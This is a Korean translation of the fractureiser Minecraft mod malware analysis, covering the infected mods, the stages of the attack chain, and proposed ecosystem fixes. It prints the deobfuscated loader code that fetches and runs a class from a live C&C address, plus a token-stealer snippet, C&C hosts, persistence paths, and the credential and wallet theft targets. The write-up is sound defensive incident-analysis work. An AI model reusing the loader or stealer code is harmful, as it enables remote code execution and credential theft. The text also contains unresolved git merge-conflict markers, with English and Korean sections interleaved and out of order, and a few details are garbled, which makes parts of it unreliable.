# 기술 정보

## 배포

일부 모드 팩은 작성자의 동의 없이 업데이트되어, 악성 모드에 대한 종속성이 추가되었습니다. 이 모드 팩 업데이트는 업로드 후 즉시 아카이브되어 웹 UI에는 표시되지 않으며 API를 통해서만 확인할 수 있습니다.

악성 모드들은 업로드 일자가 며칠 전으로 설정되어 있습니다. 이들은 대부분 자동으로 생성된 이름을 가진 일회용 계정에 의해 업로드되었으며, 이들이 감염의 시작점이 되었을 가능성이 있습니다. Luna Pixel Studios는 흥미로운 새로운 업로드 중 하나를 개발자가 테스트하는 과정에서 침해를 받았습니다.

### 알려진 영향을 받은 모드 및 플러그인들

<<<<<<< HEAD
참고: 이 목록은 **완전한 것이 아닙니다**. 이는 조사 초기에 작성된 목록으로, 빠르게 이 문제의 범위가 예상보다 훨씬 크다는 것을 깨달았기 때문에 개별 사례를 추적하는 것은 무의미해졌습니다. 이 목록은 역사적인 목적을 위해 남겨져 있습니다.

CurseForge의 [영향을 받은 프로젝트 목록](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)도 참고하세요.
=======
Note: This list is **non-comprehensive**. It was constructed in the early days of
investigation and quickly we realized the scope of this was much larger than we thought,
making tracking of individual cases pointless. It's left here for historical purposes.

See also CurseForge's
[list](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)
of affected projects.
>>>>>>> 1f61c29bdc3036bf1973fd8f109fb1652961eb2b

| 모드/플러그인              | 링크                                                                                                                                                                                                                                                                                            | SHA1                                                               | "업로더"           |
| -------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------ | ------------------ |
| Skyblock Core              | [www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565)                                                                                                                                                    | `33677CA0E4C565B1F34BAA74A79C09A3B690BF41`                         | Luna Pixel Studios |
| Dungeonz                   | [legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (removed)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100)                                                                                                                                              | `2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`                         | fractureiser       |
| Haven Elytra               | [dev.bukkit.org/projects/havenelytra/files/4551105 (removed)](https://dev.bukkit.org/projects/havenelytra/files/4551105) [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (removed)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) | `284A4449E58868036B2BAFDFB5A210FD0480EF4A`                         | fractureiser       |
| Vault Integrations         | [www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)                                                                                                                | `0C6576BDC6D1B92D581C18F3A150905AD97FA080`                         | simpleharvesting82 |
| AutoBroadcast              | [www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (removed)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)                                                                                                                                          | `C55C3E9D6A4355F36B0710AB189D5131A290DF26`                         | shyandlostboy81    |
| Museum Curator Advanced    | [www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (removed)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)                                                                                                                      | `32536577D5BB074ABD493AD98DC12CCC86F30172`                         | racefd16           |
| Vault Integrations Bug fix | [www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)                                                                                                                | `0C6576BDC6D1B92D581C18F3A150905AD97FA080`                         | simplyharvesting82 |
| Floating Damage            | [dev.bukkit.org/projects/floating-damage (removed)](https://dev.bukkit.org/projects/floating-damage)                                                                                                                                                                                            | `1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc` | mamavergas3001     |
| Display Entity Editor      | [www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (removed)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)                                                                                                            | `A4B6385D1140C111549D95EAB25CB51922EEFBA2`                         | santa_faust_2120   |

Darkhax가 다음 내용을 보냈습니다: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

추가로 가능성이 있는 모드/플러그인: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib

## Stage 0 (감염된 모드 JAR 파일)

영향을 받는 모드 또는 플러그인은 해당 클래스의 정적 초기화자(static initializer)에 새로운 `static void` 메서드가 삽입되며, 이 메서드를 호출하는 코드가 해당 클래스에 삽입됩니다. DungeonZ의 경우, 해당 메서드는 `net.dungeonz.DungeonzMain`에 `_d1385bd3c36f464882460aa4f0484c53`라는 이름으로 존재합니다. Skyblock Core의 경우, 해당 메서드는 `com.bmc.coremod.BMCSkyblockCore`에 `_f7dba6a3a72049a78a308a774a847180`라는 이름으로 삽입됩니다. HavenElytra의 경우, 해당 코드는 `valorless.havenelytra.HavenElytra`의 사용되지 않는 정적 초기화자(static initializer)에 직접 삽입됩니다.

이 메서드의 코드는 문자열 리터럴 대신 `new String(new byte[]{...})`을 사용하여 난독화되었습니다.

"Infernal Expansion Compat"의 흉내를 내는 "Create Infernal Expansion Plus"의 D3SL 샘플에서는 주된 모드 클래스에 악성 코드가 삽입되었습니다.

```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

<<<<<<< HEAD
해당 코드는 다음과 같은 작업을 수행합니다:
=======
This:
1. Creates a `URLClassLoader` with the URL `http://[85.217.144.130:8080]/dl` ([shodan](https://www.shodan.io/host/85.217.144.130))
2. Loads the class `Utility` from the classloader, fetching code from the internet
3. Calls the `run` method on `Utility`, passing a String argument different for each infected mod (!). E.g.
    * Skyblock Core: "`-74.-10.78.-106.12`"
    * Dungeonz: "`-114.-18.38.108.-100`"
    * HavenElytra: "`-114.-18.38.108.-100`"
    * Vault Integrations: "`-114.-18.38.108.-100`"
>>>>>>> 1f61c29bdc3036bf1973fd8f109fb1652961eb2b

1. `http://[85.217.144.130:8080]/dl` ( [shodan](https://www.shodan.io/host/85.217.144.130) 참조) URL을 사용하여 `URLClassLoader`를 생성합니다.
2. 해당 클래스로부터 `Utility` 클래스를 클래스로더(classloader)로부터 로드하며, 인터넷에서 코드를 가져옵니다.
3. `Utility`의 `run` 메서드를 호출하며, 각각의 감염된 모드마다 다른 문자열 인수를 전달합니다. 예를 들면:
   - Skyblock Core: "`-74.-10.78.-106.12`"
   - Dungeonz: "`114.-18.38.108.-100`"
   - HavenElytra: "`-114.-18.38.108.-100`"
   - Vault Integrations: "`-114.-18.38.108.-100`"

전달된 숫자는 Stage 1에서 바이트로 구문 분석되어 ".ref"라는 파일에 기록되며, 작성자가 감염 소스를 추적하기 위한 방법으로 보입니다.

클래스로더의 생성은 하드코딩된 URL을 사용하며, Stage 1이 사용하는 Cloudflare URL을 사용하지 않습니다. 해당 IP가 현재 오프라인이므로, 현재 알려진 Stage 0 페이로드는 작동하지 않습니다.

## Stage 1 (`dl.jar`)

SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[악성코드의 복원된 파일은 여기에서 찾을 수 있습니다](../decomp).

`Utility.run`이 가장 먼저 수행하는 작업은 시스템 속성 `neko.run`이 설정되어 있는지 확인하는 것입니다. 설정되어 있다면 *즉시 실행을 중단*합니다. 설정되어 있지 않다면 빈 문자열로 설정하고 계속 진행합니다. 이는 악성코드가 여러 모드에 감염되었을 경우 자체 실행을 피하기 위한 시도로 보입니다. _Stage 1은 인터넷에서 다운로드되므로, 자체적인 종료 스위치로서 의존해서는 안 됩니다._

악성코드는 `85.217.144.130`과 Cloudflare Pages 도메인 (`https://files-8ie.pages.dev/ip`)에 연락을 시도합니다. 이미 항의 보고가 전송되었습니다. Pages 도메인은 첫 번째 IP에 응답이 없는 경우 C&C 서버의 IP를 가져오기 위해 사용됩니다. 해당 URL은 이진 형식의 IPv4 주소로 응답합니다.

_C&C IP는 서버 제공자에게 항의 보고를 한 후에 nullroute 처리되었습니다. 새로운 C&C 서버가 설립되었는지 Cloudflare 페이지를 주시해야 합니다. 그들이 이에 대비하지 않았을 것으로 생각할 수 없습니다._ 신속한 응답에 감사드립니다, Serverion.

_Cloudflare Pages 도메인이 종료되었습니다._ `107.189.3.101`에 새로운 C&C 서버가 있습니다.

Stage 1은 다음과 같은 방법으로 영속성을 달성하려고 합니다:

1. 서버에서 Stage 2 (`lib.jar`는 Linux에서, `libWebGL64.jar`는 Windows에서)를 다운로드합니다.
2. Stage 2를 자동으로 시작 프로그램으로 실행하려고 합니다:
   - Linux에서는 `/etc/systemd/system` 또는 `~/.config/systemd/user`에 systemd 단위 파일을 배치하려고 시도합니다.
     - 사용자 폴더에 배치되는 단위 파일은 제대로 작동하지 않습니다. 사용자 단위에는 `multi-user.target`이 존재하지 않기 때문입니다.
   - Windows에서는 레지스트리(`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`)를 수정하여 자체 실행을 시작하려고 시도하거나,
     그렇지 않은 경우 `Windows\Start Menu\Programs\Startup` 폴더에 자체를 추가하려고 시도합니다.

## Stage 2 (`lib.jar` 또는 `libWebGL64.jar`)

알려진 SHA-1 해시:

- `52d08736543a240b0cbbbf2da03691ae525bb119`
- `6ec85c8112c25abe4a71998eb32480d266408863` (D3SL의 이전 업로드)

Stage 2는 Allatori 난독화 도구의 데모 버전으로 난독화되어 있으며, 주 클래스는 `Bootstrap`입니다. 또한 `h`라는 다른 클래스가 포함되어 있으며, 간단한 통신 클래스로 보입니다. 그러나 그 외에는 비어 있습니다. 소스 코드의 재구성 시도는 [여기](https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe)에서 확인할 수 있습니다.

실행되면 다음 작업을 수행합니다:

1. 포트 `9655`를 열고 JVM이 종료될 때 해당 포트를 닫기 위해 셧다운 후크를 추가합니다.
2. 자신이 디스크 상에 위치하고 옆에서 작동합니다.
3. `.ref` 파일이 존재하는 경우, 해당 파일에서 식별자 키를 읽어옵니다.
4. 다음을 반복하는 루프를 실행합니다.
   1. `https://[files-8ie.pages.dev]:8083/ip`에서 서버를 확인하고 연결을 시도합니다.
   2. 업데이트 확인을 계속해야 할지 여부에 대한 플래그를 수신하며, 그렇지 않다면 예외를 throw합니다 (포트 `1338`에서 서버에 보고함).
   3. 그렇다면, 해시를 수신하고 `client.jar`와 일치하는지 확인한 후, 업데이트 여부를 나타내는 바이트를 보냅니다.
   4. 그렇다면, `client.jar`를 수신하여 덮어쓰거나 생성하며, 파일 속성을 사용하여 숨깁니다.
   5. `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)` 정적 메서드를 로드하고 호출합니다.
   6. 5초 동안 슬립합니다.

## Stage 3 (`client.jar`)

SHA-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
SHA-1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`

`client.jar`은 굉장히 난독화되고 복잡한 코드 번들로, 자바와 네이티브 코드를 모두 포함하고 있습니다.

`client.jar`에는 `hook.dll`이라는 네이티브 페이로드가 포함되어 있으며, 다음 링크에서 디컴파일된 코드를 확인할 수 있습니다: [hook.dll.c](https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c)

Java에서 호출하기 위해 고안된 두 가지 네이티브 함수가 있습니다. JNI를 통해 호출될 수 있습니다:

- `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
- `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

<<<<<<< HEAD
분석 결과, 이 함수들은 다음과 같은 작업을 수행합니다:
=======
There is also evidence of code attempting to do the following:
* Scan for *all* jar files on the system that look like Minecraft mods (by detecting
  Forge/Fabric/Quilt/Bukkit), or [declare a Main
  class](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)
  (most plain Java programs) and attempt to inject Stage 0 into them
* Steal cookies and login information for many web browsers
* Replace cryptocurrency addresses in the clipboard with alternates that are presumably owned by the attacker
* Steal Discord credentials
* Steal Microsoft and Minecraft credentials, from a variety of launchers
* Steal crypto wallets
>>>>>>> 1f61c29bdc3036bf1973fd8f109fb1652961eb2b

- 클립보드 내용 읽기
- Microsoft 계정 자격 증명 탈취

또한 다음과 같은 작업을 수행하려는 코드의 증거도 있습니다:

- Forge/Fabric/Quilt/Bukkit을 감지하여 마인크래프트 모드로 추정되는 _시스템 상의 모든_ JAR 파일을 스캔하거나 ([Main 클래스를 선언](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)하며 (대부분의 일반 자바 프로그램) Stage 0을 주입하려고 시도합니다.
- 다양한 웹 브라우저의 쿠키 및 로그인 정보 탈취
- 클립보드의 암호화폐 주소를 공격자가 소유한 대체 주소로 교체
- Discord 자격 증명 탈취
- 다양한 런처에서 Microsoft 및 Minecraft 자격 증명 탈취
- 암호화폐 지갑 탈취

Minecraft 모드 또는 플러그인으로서 JAR 파일을 휴리스틱하게 감지하는 방법은 다음과 같습니다:

- Forge (`dev/neko/e/e/e/A`): 악성코드는 모든 모드에서 필요한 `@Mod` 주석을 찾으려고 합니다.
- Bukkit (`dev/neko/e/e/e/C`): 악성코드는 클래스가 Bukkit의 `JavaPlugin` 클래스를 확장하는지 확인합니다.
- Fabric/Quilt (`dev/neko/e/e/e/i`): 악성코드는 클래스가 `ModInitializer`를 구현하는지 확인합니다.
- Bungee (`dev/neko/e/e/e/l`): 악성코드는 클래스가 Bungee의 `Plugin` 클래스를 확장하는지 확인합니다.
- Vanilla (`dev/neko/e/e/e/c`): 악성코드는 메인 클라이언트 클래스인 `net.minecraft.client.main.Main`이 존재하는지 확인합니다.

약 2023년 6월 7일 14:20 UTC에 Stage3 클라이언트 JAR 파일이 누출되어 보이는 것으로 보입니다. 해당 파일은 암호화되지 않은 버전으로 교체되었습니다. 아카이브 파일은 다음 링크에서 확인할 수 있습니다: https://github.com/clrxbl/NekoClient

이를 통해 이전의 암호화된 `client.jar` 샘플에 대한 분석 결과로 추정된 동작/증거가 유효함을 확인할 수 있습니다.

### 복제

복제는 로컬 머신의 전체 파일 시스템에서 JAR 파일의 클래스를 자동으로 처리함으로써 수행됩니다. 특정 기준을 충족하는 클래스를 포함한 모든 JAR 파일이 감염 대상이 됩니다. 로컬 파일 시스템을 스캔하고 악성 코드를 삽입하는 프로세스는 여기에서 찾을 수 있습니다: dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])

프로세스가 검사하는 기준은 여기에서 찾을 수 있습니다: dev/neko/nekoinjector/template/impl

<<<<<<< HEAD
BungeecordPluginTemplate은 클래스에서 인터페이스 net/md_5/bungee/api/plugin/Plugin을 찾습니다.
FabricModTemplate은 클래스에서 인터페이스 net/fabricmc/api/ModInitializer을 찾습니다.
ForgeModTemplate은 클래스에서 어노테이션 net/minecraftforge/fml/common/Mod을 찾습니다.
MinecraftClientTemplate은 JAR 파일에서 net/minecraft/client/main/Main.class 및 net/minecraft/client/gui/GuiMultiplayer.class의 존재를 확인합니다.
SpigotPluginTemplate은 클래스에서 슈퍼 타입 org/bukkit/plugin/java/JavaPlugin을 찾습니다.
위의 기준에 해당하지 않는 경우, JAR 파일의 주 클래스를 감염 대상으로 시도합니다 - 주 클래스가 존재하는 경우에만 수행됩니다.
=======
Something not commonly seen in JVM malware that is present here is a class titled `VMEscape`. It checks if its in [Windows Sandbox](https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview) by checking if the current user is `WDAGUtilityAccount`. If this condition is met, an attempt to escape Windows Sandbox is made.
>>>>>>> 1f61c29bdc3036bf1973fd8f109fb1652961eb2b

주입된 악성 코드는 Stage0에서 확인한 백도어 로직입니다. 주입 방식은 악성 코드가 `Loader` 클래스의 정적 메서드에 선언되는 것입니다. 그 옆에 있는 `Injector` 클래스는 `Loader`에서 코드를 추출하고 감염 대상이 되는 새로운 클래스에 삽입하는 역할을 담당합니다. `Injector.loadInstallerNode(...)`의 반환 값은 감염 프로세스 자체를 개요화한 `MethodNode`입니다. 이제 그 메서드를 대상 클래스에 추가하기만 하면 됩니다. [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272)에서 `Entry.inject(MethodNode)`를 호출하여 이를 수행합니다. 악성 메서드가 호출되도록 하기 위해 `inject` 메서드는 대상 클래스의 정적 이니셜라이저에 추가된 메서드를 호출하는 로직을 추가합니다. 정적 이니셜라이저는 클래스가 처음으로 로드될 때 실행되며, 대상 클래스가 플러그인/모드인 경우에는 항상 이 코드가 감염된 모드팩이나 서버를 실행하는 사용자에 의해 트리거될 것으로 가정됩니다. 이후에는 새로 감염된 대상 클래스로 JAR 파일을 재패키징합니다.

<<<<<<< HEAD
### 안티-샌드박스 기법
=======
- Start a repeating thread to run the following actions:
  - Create a temporary directory using `Files.createTempDirectory(...)`
  - Iterate over `FileDescriptor` entries in the system clipboard which mirrors the hosts clipboard 
  - Create a shortcut that looks like the original file _(using icons from SHELL32)_ but instead invokes the malware
  - Assings this shortcut to the clipboard, overwriting the original file reference
>>>>>>> 1f61c29bdc3036bf1973fd8f109fb1652961eb2b

JVM(Java Virtual Machine) 악성 소프트웨어에서 흔히 볼 수 없는 기능 중 하나는 `VMEscape`라는 클래스입니다. 이 클래스는 현재 사용자가 [Windows Defender Application Guard](https://www.majorgeeks.com/content/page/what_is_the_wdagutilityaccount.html)의 일부인 `WDAGUtilityAccount`인지 확인하여 샌드박스된 Windows 환경에서 실행 중인지 확인합니다. 이 조건이 충족되면 샌드박스 시스템 탈출을 시도합니다.

주요 과정은 다음과 같습니다:

<<<<<<< HEAD
- 다음 작업을 반복하는 스레드를 시작합니다:
  - `Files.createTempDirectory(...)`를 사용하여 임시 디렉토리를 생성합니다.
  - 시스템 클립보드에서 `FileDescriptor` 항목을 반복합니다. (이로 인해 호스트의 내용에 액세스하게 됨)
  - 원본 파일처럼 보이는 바로 가기를 생성합니다. (SHELL32에서 아이콘을 사용)
  - 이 바로 가기를 클립보드에 할당하여 원본 파일 참조를 덮어씁니다.
=======
**MSA Tokens**: Since this mod is targeting Minecraft mods, it's only natural to attempt to steal the MSA token used to login to Minecraft with. Some launchers keep this data in a local file, which this malware will attempt to read from. This affects a variety of launchers such as:
>>>>>>> 1f61c29bdc3036bf1973fd8f109fb1652961eb2b

따라서 사용자가 파일을 복사하고 다른 곳에 붙여넣을 때 의도한 파일 대신 악성 소프트웨어가 실행되는 것처럼 보이는 바로 가기가 붙여지게 됩니다.

### 데이터 도난

**MSA 토큰**: 이 모드가 Minecraft 모드를 대상으로 하기 때문에 Minecraft에 로그인하는 데 사용되는 MSA 토큰을 도용하는 시도가 자연스럽습니다. 일부 런처는 이 데이터를 로컬 파일에 저장하며, 이 악성코드는 해당 파일에서 읽으려고 시도합니다. 이는 다음과 같은 다양한 런처에 영향을 미칩니다:

- 기본/모장 런처
- 기존의 기본/모장 런처
- PolyMC / Prism
- Technic
- Feather
- LabyMod (< v3.9.59)
- 그리고 [Windows 자격 증명 관리자](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0)에서 발견된 모든 MSA 토큰

데이터를 검색하는 로직( [`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java)에서 확인할 수 있음)은 다양한 항목에서 유사하게 보입니다. 이들은 데이터를 유사한 방식으로 저장하기 때문입니다. 예를 들어 LabyMod의 코드는 다음과 같습니다:

```java
private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
	String appdata = System.getenv("APPDATA");
	if (Platform.isWindows() || Objects.isNull(appdata)) {
		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
		if (Files.isReadable(path)) {
			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
		}
	}
}
```

Feather/PolyMC/Prism에서 토큰을 가져오는 코드는 본질적으로 동일합니다.

이 전략에서 기본 런처로의 변경은 Json이 추가적인 암호화 층을 가지고 있다는 것입니다.

<<<<<<< HEAD
Technic으로의 전략 변경은 Technic이 Java의 내장 객체 직렬화를 사용하여 자격 증명을 저장한다는 점입니다. 이는 `com.google.api.client.auth.oauth2.StoredCredential` 타입을 래핑합니다.
=======
**Discord tokens**: Everyone's seen a token-stealer before. Steals token and extra information such as payment methods, linked phone number, etc. Affects the standard client, canary, ptb, and lightcord clients. Relevant source: [`dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java`](https://github.com/clrxbl/NekoClient/blob/fd76c5f9d40d1e10de11f00a6b4e0cca3d6221a3/dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java)
>>>>>>> 1f61c29bdc3036bf1973fd8f109fb1652961eb2b

**Discord 토큰**: 토큰 도용은 누구나 본 적이 있을 것입니다. 일반 클라이언트, canary, ptb 및 lightcord 클라이언트에 영향을 줍니다.

**쿠키 및 저장된 자격 증명**: 영향을 받는 브라우저에 저장된 쿠키와 로그인 자격 증명을 도용합니다. 관련 소스: [`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)

- Mozilla Firefox
  - Waterfox
  - Pale Moon
  - SeaMonkey
- Chrome
  - Edge
  - Brave
  - Vivaldi
  - Yandex
  - Slimjet
  - CentBrowser
  - Comodo
  - Iridium
  - UCBrowser
  - Opera
    - Beta
    - Developer
    - Stable
    - GX
    - Crypto
  - CryptoTab

## Stage 3b (`dummyloader3.jar`)

두 번째 C&C 서버가 활성화된 후 어느 시점 이후로 Stage 3이 다른 JAR로 대체되었습니다.

이 JAR은 SkyRage 업데이터로 보이며, blackspigot을 대상으로 하는 또 다른 마인크래프트 악성 소프트웨어입니다.

### 지속성

- Windows: 작업 스케줄러 `MicrosoftEdgeUpdateTaskMachineVM`, 파일 `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`
- Linux: `/bin/vmd-gnu`, `/etc/systemd/system/vmd-gnu.service`, 서비스 `vmd-gnu`

### 연결

- C&C 서버: `connect.skyrage.de`
- 다운로드: `hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqqq`

### 동작

- `qqqqqqqqq` JAR은 브라우저 쿠키, 디스코드, 마인크래프트, Epic Games, 스팀 로그인 등 다양한 정보를 추출하며, 암호화폐 지갑 및 비밀번호 관리자에 대한 일부 정보도 추출합니다. 이 업데이트 JAR은 추출한 정보를 C&C 서버에 업로드합니다.
- 클립보드에서 암호화폐 주소를 `95.214.27.172:18734`에서 받은 주소로 교체합니다.
- 지속성 (위 참조)
- 자동 업데이터가 포함되어 있으며, 현재 버전은 932입니다 (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)

### 매핑

이 샘플의 매핑은 Enigma나 다른 Enigma 매핑을 지원하는 도구를 통해 적용할 수 있습니다.

```
CLASS D Chat
CLASS E ChatChain
CLASS E$a ChatChain$ChainLink
CLASS F ClientChat
CLASS G EncryptionRequest
CLASS H EncryptionResponse
CLASS H$a EncryptionResponse$EncryptionData
CLASS J KeepAlive
CLASS L LoginPayloadResponse
CLASS O PluginMessage
CLASS O$1 BungeeCordProtocolVersionMapFunction
CLASS P SetCompression
CLASS R StatusResponse
CLASS T CryptocurrencyClipboardLogger
CLASS T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
CLASS U AutoRunPersistence
CLASS V InputStreamFileWriter
CLASS W OperatingSystem
CLASS X AutoUpdater
CLASS Y StacktraceSerializer
CLASS a MalwareClientConnectionHandler
CLASS b Main
    FIELD a intconst I
    FIELD a string0 Ljava/lang/String;
    FIELD a ipAddress Ljava/net/InetSocketAddress;
CLASS g MinecraftBot
CLASS h MinecraftBot2
CLASS o MinecraftFriendlyByteBuf
CLASS s MinecraftIPAddressResolver
CLASS t MinecraftPacketDecoder
CLASS y MinecraftPacketEncryption
```

### 반역적인 디컴파일에 대한 대응

이 샘플은 클래스 파일의 기술적인 세부 사항을 악용하여 디컴파일 도구를 크래시시킵니다. 이와 같은 취약점은 [CAFED00D](https://github.com/Col-E/CAFED00D)를 사용하여 수정할 수 있습니다. CAFED00D는 잘못된 속성을 필터링하는 바이트코드 파서입니다. 이후에는 Allatori 데모에서 적용된 기본적인 난독화만 처리하면 됩니다.

# 기타 정보

더 자세한 내용은 실시간 Stage-3 복호화 문서에서 확인할 수 있습니다: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ

두 번째 C&C 서버가 가동되면서 Stage 3의 복호화된 버전이 약 40분 동안 실수로 제공되었습니다.

메인 페이로드 서버는 네덜란드에 소재한 Serverion라는 회사에서 호스팅되었습니다. (현재 더 이상 작동하지 않음)

새로운 C&C 서버도 다운되었습니다. _2023-06-07 18:51 UTC_

`85.217.144.130` 및 `107.189.3.101`에서는 80/443 포트의 HTTP 서버와 22 포트의 SSH 서버 외에도 다음 포트가 열려 있었습니다:

- 1337
- 1338 (Stage 1의 파일에서 새로운 디버거 연결을 생성하는 데 사용된 포트)
- 8081 (웹소켓 서버입니다. 현재는 알려진 기능이 없으며 악성 코드에 참조되지 않습니다.)
- 8082 (아무런 결과를 얻을 수 없었으며, 악성 코드에 참조되지 않았습니다.)
- 8083 (Stage 1에서 연락을 취하는 포트)

흥미로운 점은 fractureiser의 Bukkit 페이지에 "Last active Sat, Jan, 1 2000 00:00:00"이라고 표시되어 있다는 것입니다. https://dev.bukkit.org/members/fractureiser/projects/

## 샘플

샘플에 대한 읽기 또는 읽기/쓰기 액세스를 위해 IRC 채팅에서 요청하세요. Stage 3 클라이언트의 디컴파일된 소스 코드는 다음에서 확인할 수 있습니다: https://github.com/clrxbl/NekoClient

## 추후 대응 방안

장기적인 추후 대응에 대해서는 아직 조금 이르지만, 이 사건을 통해 모디파이드 마인크래프트 생태계에서 몇 가지 심각한 결함이 드러났습니다. 이 섹션은 이러한 결함들과 개선 방안에 대한 논의입니다.

#### 1. 모드 저장소에서의 검토가 부족합니다.

CurseForge와 Modrinth는 모드를 "검토"할 때 정확히 어떤 작업을 수행하는 건지에 대해 우리 커뮤니티가 알아야 합니다. 보안은 관찰할 수 없음을 통한 안전성에 의존하는 대신에 우리는 어떤 검토 방식을 사용해야 할까요? 정적 분석을 실행해야 할까요? (williewillus는 여기에 대한 몇 가지 아이디어를 가지고 있습니다.)

#### 2. 모드에 대한 코드 서명이 부족합니다.

일반적인 소프트웨어 산업과 달리, 저장소에 업로드된 모드는 보통 소유자를 증명하는 서명 키로 서명되지 않습니다. 서명과 별도의 키 분배/신뢰 메커니즘이 있는 경우 CurseForge 계정이 침해되는 것을 완화할 수 있습니다.

하지만 이로 인해 키 신뢰의 보다 큰 문제가 발생하며, "이 JAR 파일은 이 서명을 가지고 있다"는 사실은 CurseForge/Modrinth 외부에서 표준화된 방식으로 전달되어 로더 또는 사용자가 서명을 확인할 수 있어야 합니다.
Forge는 서명 기능을 도입하려고 했지만, 그 당시에는 제한적으로 사용되었습니다.

#### 3. 재현 가능한 빌드의 부재

마인크래프트 도구 체인은 혼돈스러운 상태이며, 빌드는 일반적으로 재현 가능하지 않습니다. 빌드 스크립트가 임의의 Gradle 플러그인의 암호화되지 않은 -SNAPSHOT 버전을 가져와 사용하는 것이 일반적이며, 이로 인해 재현 가능하지 않고 감사할 수 없는 아티팩트가 생성됩니다.

임의의 Gradle 플러그인이 향후 공격 벡터가 될 수 있다는 가능성은 배제할 수 없습니다.

#### 4. 마인크래프트 자체의 샌드박싱 부재

자바 에디션의 모드 개발은 항상 자바의 모든 기능을 사용할 수 있는 힘을 가지고 있었으며, 이는 양날의 검의 한 면입니다. 악성 코드는 광범위한 영향을 미칠 수 있습니다. 마인크래프트 자체는 어떤 형태의 샌드박싱도 적용되지 않고, 서버도 소유자가 충분히 숙지하지 않으면 일반적으로 샌드박싱이 되지 않습니다.

좋은 샌드박싱은 어렵습니다. 특히 SELinux/AppArmor와 같은 시스템에서는 사용자 경험이 매우 부족하여 그들을 적용하지 않는 경우가 많습니다.
